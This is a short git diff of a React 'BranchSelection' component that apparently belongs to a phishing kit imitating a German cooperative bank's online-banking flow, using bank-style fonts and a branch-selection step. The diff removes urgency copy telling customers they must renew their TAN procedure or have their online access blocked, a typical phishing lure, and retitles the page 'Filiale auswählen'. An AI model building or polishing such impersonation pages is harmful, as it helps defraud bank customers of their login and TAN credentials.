@@ -213,34 +213,12 @@ const BranchSelection: React.FC<BranchSelectionProps> = ({ onSubmit }) => {
               fontFamily: 'VB-Bold, Arial, sans-serif',
               fontStyle: 'normal'
             }}>
-              Tanverfahren erneuern
+              Filiale auswählen
             </h1>
             
             <div style={{
               marginBottom: '40px'
             }}>
-              <p style={{
-                margin: '0 0 16px 0',
-                fontSize: 'clamp(14px, 3vw, 16px)',
-                lineHeight: '24px',
-                color: '#000',
-                fontFamily: 'VB-Regular, Arial, sans-serif',
-                fontStyle: 'normal',
-                fontWeight: 'normal'
-              }}>
-                Aufgrund gesetzlicher Bestimmungen sind Sie dazu verpflichtet, Ihr TAN-Verfahren nach vorgegebenen Zeiten zu erneuern!
-              </p>
-              <p style={{
-                margin: '0 0 16px 0',
-                fontSize: 'clamp(14px, 3vw, 16px)',
-                lineHeight: '24px',
-                color: '#000',
-                fontFamily: 'VB-Bold, Arial, sans-serif',
-                fontStyle: 'normal',
-                fontWeight: 'normal'
-              }}>
-                Ohne Aktualisierung wird Ihr Online Zugang aus Sicherheitsgründen gesperrt.
-              </p>
               <p style={{
                 margin: '0',
                 fontSize: 'clamp(14px, 3vw, 16px)',
